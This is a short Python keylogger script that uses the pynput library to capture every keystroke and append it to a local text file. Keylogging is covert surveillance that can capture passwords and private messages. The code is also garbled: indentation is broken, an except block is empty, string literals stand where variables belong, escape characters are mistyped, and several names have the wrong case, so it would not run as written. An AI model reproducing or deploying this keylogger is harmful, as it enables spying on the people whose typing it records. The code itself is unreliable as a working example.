from pynput import keyboard
def keypressed (key):
    with open("keyfile.txt",'a') as logkey:
      try:
            if key.char:
          logkey.write('key.char')
    except:
if Key == keyboard.key.space:
    logkey.write(' ')
elif key== keyboard.key.enter:
    logkey.write('/n ')
elif key== keyboard.key.tab:
    logkey.write('/t ')
else:
    logkey.write('[{key.name}]')     

    if__name__=="__main__":
    listener=keyboard.Listener(on_press=keypressed)
    listener.start()
    listener.join()